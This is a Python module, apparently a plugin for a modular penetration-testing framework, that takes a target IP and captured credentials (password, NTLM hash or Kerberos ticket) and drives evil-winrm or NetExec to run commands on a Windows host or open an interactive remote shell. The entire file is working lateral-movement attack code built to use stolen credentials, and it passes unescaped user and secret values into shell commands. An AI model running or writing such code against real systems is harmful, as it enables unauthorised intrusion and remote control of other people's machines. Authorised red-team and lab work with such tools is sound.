PROVIDES = ["exec"]
REQUIRES = ["creds"]

def run(data, cred, args):
    import subprocess

    ip = data.get("ip")
    domain = data.get("domain")

    if not ip:
        print("[!] No target IP set")
        return

    if not cred:
        print("[!] No credentials available")
        return

    user = cred.get("user")
    typ = cred.get("type")
    secret = cred.get("secret")

    cmd_input = getattr(args, "cmd", None)

    # ---------------- BUILD COMMAND ----------------
    base_cmd = None

    if typ == "password":
        if domain:
            base_cmd = f"evil-winrm -i {ip} -u {user} -p '{secret}'"
        else:
            base_cmd = f"evil-winrm -i {ip} -u {user} -p '{secret}'"

    elif typ == "ntlm":
        base_cmd = f"evil-winrm -i {ip} -u {user} -H {secret}"

    elif typ == "ticket":
        # assumes ccache path in secret
        base_cmd = f"KRB5CCNAME={secret} evil-winrm -i {ip} -u {user} -k"

    else:
        print(f"[!] Unsupported credential type: {typ}")
        return


    # ---------------- COMMAND MODE ----------------
    if cmd_input:
        import shlex

        safe_cmd = shlex.quote(cmd_input)

        if typ == "password":
            full_cmd = f"nxc winrm {ip} -u {user} -p '{secret}' -X {safe_cmd} --no-progress"

        elif typ == "ntlm":
            full_cmd = f"nxc winrm {ip} -u {user} -H {secret} -X {safe_cmd} --no-progress"

        elif typ == "ticket":
            full_cmd = f"KRB5CCNAME={secret} nxc winrm {ip} -u {user} --use-kcache -X {safe_cmd} --no-progress"

        else:
            print(f"[!] Unsupported credential type: {typ}")
            return

        result = subprocess.run(
            full_cmd,
            shell=True,
            capture_output=True,
            text=True
        )
        # ---------------- PARSE OUTPUT ----------------
        clean = []
        errors = []

        for line in result.stdout.splitlines():
            stripped = line.strip()

            if not stripped:
                continue

            # capture errors
            if "[-]" in stripped:
                errors.append(stripped)
                continue

            if stripped.startswith("WINRM"):
                # split by columns (robust)
                parts = stripped.split()

                # everything after hostname column is the "message"
                # structure: WINRM IP PORT HOSTNAME MESSAGE...
                if len(parts) >= 5:
                    message = " ".join(parts[4:]).strip()

                    # skip noise
                    if any(x in message for x in [
                        "Windows",
                        "Pwn3d!",
                        "Executed command"
                    ]):
                        continue

                    clean.append(message)

                continue

            # fallback (rare)
            clean.append(stripped)


        # ---------------- PRINT ----------------
        if clean:
            print("\n".join(clean))
        else:
            print("[!] No usable output")

        if errors:
            print("\n[!] Warnings:\n")
            print("\n".join(errors))

    # ---------------- INTERACTIVE MODE ----------------
    else:
        print(f"[*] Running: {base_cmd}")
        print("[+] Opening interactive WinRM shell...\n")
        subprocess.run(base_cmd, shell=True)
        return